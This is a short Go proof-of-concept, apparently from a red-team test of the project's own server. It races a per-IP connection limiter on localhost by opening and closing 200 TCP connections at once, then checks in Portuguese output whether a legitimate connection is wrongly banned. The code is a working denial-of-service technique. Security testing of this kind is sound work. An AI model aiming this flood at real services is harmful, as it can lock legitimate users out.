package main

// PoC 02: IP Ban Denial of Service via State Drift (Race Condition)
import (
	"fmt"
	"net"
	"sync"
	"time"
)

func main() {
	var wg sync.WaitGroup
	addr := "127.0.0.1:9999"

	fmt.Printf("[☠️ Red Team PoC] Launching Race DoS against Limiter at %s...\n", addr)
	// Launch massive sudden connections to race the perIPConns.LoadOrStore / Delete logic
	for i := 0; i < 200; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("tcp", addr)
			if err != nil {
				return
			}
			// Immediatelly close to trigger rapid decrement that overlaps with LoadOrStore
			conn.Close()
		}()
	}

	wg.Wait()

	// Wait for dust to settle
	time.Sleep(1 * time.Second)
	
	fmt.Println("[+] Attempting legitimate connection...")
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Println("[+] Attack Failed to start dialing: ", err)
		return
	}
	
	// Prevenção inteligente contra Slowloris no server nos desconectará se não mandarmos mágica em 3s
	// Se formos desconectados ANTES, fomos banidos (drop L4 imediato, sem log L7).
	conn.SetReadDeadline(time.Now().Add(1 * time.Second))
	buf := make([]byte, 2)
	_, err = conn.Read(buf)
	if err != nil && err.Error() == "EOF" {
		fmt.Printf("=> VULNERABILIDADE DETECTADA: Você foi DERRUBADO pela porta (%v). Limite IP travado!\n", err)
	} else {
		fmt.Printf("=> O Sistema pode estar patched ou race event não foi tickado (tentar mais vezes).\n")
	}
	conn.Close()
}
